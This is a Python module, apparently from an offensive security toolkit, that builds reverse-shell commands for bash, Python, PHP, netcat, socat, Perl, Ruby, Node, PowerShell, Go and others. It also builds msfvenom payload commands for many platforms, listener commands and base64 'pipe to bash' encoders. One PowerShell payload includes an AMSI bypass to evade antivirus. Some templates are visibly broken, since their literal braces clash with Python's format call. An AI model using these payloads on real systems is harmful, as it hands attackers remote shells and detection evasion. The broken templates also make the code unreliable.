import json, base64
from typing import Dict, List, Optional

from tools.log_utils import get_logger

logger = get_logger("reverse_shell")

SHELLS = {
    "bash_tcp": 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
    "bash_readline": 'exec 5<>/dev/tcp/{lhost}/{lport}; cat <&5 | while read line; do $line 2>&5 >&5; done',
    "python_tcp": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
    "python3_win": "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe'])\"",
    "python2_win": "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe'])\"",
    "php_tcp": "php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "php_win": "php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"cmd.exe <&3 >&3 2>&3\");'",
    "nc_tcp": 'nc -e /bin/sh {lhost} {lport}',
    "nc_e_tcp": 'nc {lhost} {lport} -e /bin/sh',
    "ncat_tcp": 'ncat {lhost} {lport} -e /bin/sh',
    "socat_tty": 'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}',
    "socat_win": 'socat exec:\'cmd.exe\',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}',
    "perl_tcp": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'",
    "ruby_tcp": "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "node_tcp": "node -e 'require(\"net\").connect({port:{lport},host:\"{lhost}\"},function(s){require(\"child_process\").exec(\"/bin/sh -i\",function(e,o,e){s.end()})})'",
    "openssl_tcp": "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {lhost}:{lport} > /tmp/s; rm /tmp/s",
    "telnet_tcp": "telnet {lhost} {lport} | /bin/sh | telnet {lhost} {lport+1}",
    "awk_tcp": "awk 'BEGIN{s=\"/inet/tcp/0/{lhost}/{lport}\";while(42){do{printf \"shell>\"|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}};close(s)}}'",
    "lua_tcp": "lua -e 'local s=require(\"socket\");local t=s.tcp();t:connect(\"{lhost}\",{lport});while true do local r,x=t:receive();local f=io.popen(r,\"r\");local o=f:read(\"*a\");t:send(o);end'",
    "powershell_tcp": "$client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
    "powershell_amsi": "[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiInitFailed\",\"NonPublic,Static\").SetValue($null,$true);$c=New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\"PS \"+(pwd).Path+\"> \";$sb1=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb1,0,$sb1.Length);$s.Flush()};$c.Close()",
    "golang_tcp": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{lhost}:{lport}\");cmd:=exec.Command(\"cmd.exe\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go",
}

MSFVENOM_TEMPLATES = {
    "linux_x64_reverse": 'msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf',
    "linux_x86_reverse": 'msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf',
    "linux_meterpreter": 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o met.elf',
    "windows_x64_reverse": 'msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe',
    "windows_x86_reverse": 'msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe',
    "windows_meterpreter": 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o met.exe',
    "php_reverse": 'msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o shell.php',
    "python_reverse": 'msfvenom -p cmd/unix/reverse_python LHOST={lhost} LPORT={lport} -f raw -o shell.py',
    "asp_reverse": 'msfvenom -p windows/shell/reverse_tcp LHOST={lhost} LPORT={lport} -f asp -o shell.asp',
    "aspx_reverse": 'msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f aspx -o shell.aspx',
    "war_jsp": 'msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war -o shell.war',
    "jsp_reverse": 'msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shell.jsp',
    "linux_arm_reverse": 'msfvenom -p linux/armle/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf',
    "linux_mips_reverse": 'msfvenom -p linux/mipsle/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf',
    "solaris_x86_reverse": 'msfvenom -p solaris/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf',
    "osx_x64_reverse": 'msfvenom -p osx/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f macho -o shell.macho',
    "android_reverse": 'msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o shell.apk',
    "linux_stageless": 'msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} PrependSetuid=true -f elf -o shell.elf',
    "windows_stageless": 'msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} PrependMigrate=true -f exe -o shell.exe',
    "linux_meterpreter_stageless": 'msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o met.elf',
    "windows_meterpreter_stageless": 'msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o met.exe',
}

LISTENER_TYPES = {
    "nc": 'nc -lvnp {lport}',
    "rlwrap": 'rlwrap nc -lvnp {lport}',
    "ncat": 'ncat -lvnp {lport}',
    "socat": 'socat TCP-LISTEN:{lport},reuseaddr,fork',
    "powershell": 'powershell -c "$l=[System.Net.Sockets.TcpListener]{lport};$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne0){{[char[]]$c=([text.encoding]::ASCII).GetString($b,0,$i);$o=(iex $c 2>&1|Out-String);$b2=([text.encoding]::ASCII).GetBytes($o);$s.Write($b2,0,$b2.Length)}}"',
}

ENCODERS = {
    "raw": lambda s: s,
    "url": lambda s: s.replace(" ", "%20").replace("'", "%27").replace("\"", "%22").replace("$", "%24").replace("(", "%28").replace(")", "%29").replace(";", "%3B").replace("&", "%26").replace("|", "%7C").replace("<", "%3C").replace(">", "%3E"),
    "b64": lambda s: "echo %s | base64 -d | bash" % base64.b64encode(s.encode()).decode(),
    "b64_sh": lambda s: 'sh -c "echo %s | base64 -d | sh"' % base64.b64encode(s.encode()).decode().rstrip("="),
    "ps_b64": lambda s: "powershell_amsi_bypass (requires manual encoding)",
}


def run(lhost: str = "LHOST", lport: int = 4444, encode: str = "raw") -> Dict:
    result = {
        "shells": [],
        "listeners": [],
        "msfvenom": [],
    }

    for name, tpl in SHELLS.items():
        cmd = tpl.format(lhost=lhost, lport=lport)
        if encode in ENCODERS:
            try:
                encoded = ENCODERS[encode](cmd)
                result["shells"].append({"name": name, "command": encoded,
                                          "encode": encode})
            except Exception as e:
                logger.debug("encode %s/%s: %s", name, encode, e)
                result["shells"].append({"name": name, "command": cmd,
                                          "encode": "raw"})
        else:
            result["shells"].append({"name": name, "command": cmd,
                                      "encode": "raw"})

    for name, tpl in LISTENER_TYPES.items():
        cmd = tpl.format(lport=lport)
        result["listeners"].append({"name": name, "command": cmd})

    for name, tpl in MSFVENOM_TEMPLATES.items():
        cmd = tpl.format(lhost=lhost, lport=lport)
        result["msfvenom"].append({"name": name, "command": cmd})

    return result
